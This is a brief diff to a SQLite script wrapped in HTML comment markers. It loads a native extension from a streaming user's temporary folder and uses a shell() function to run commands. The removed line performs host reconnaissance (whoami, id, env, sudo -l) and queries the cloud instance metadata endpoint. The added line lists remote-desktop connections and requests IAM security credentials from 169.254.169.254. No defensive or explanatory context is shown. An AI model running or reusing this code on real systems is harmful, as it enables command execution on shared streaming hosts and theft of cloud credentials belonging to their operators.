@@ -1,4 +1,4 @@
 -- <html>
 .load /home/as2-streaming-user/MyFiles/TemporaryFiles/extension
-select shell("whoami; id; ls -al ~/; env; sudo -l; curl curl http://169.254.169.254/latest/meta-data/; curl http://169.254.169.254/latest/meta-data/iam/info; ");
+select shell("/usr/bin/dcv list-connections; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/; ");
 -- </html>
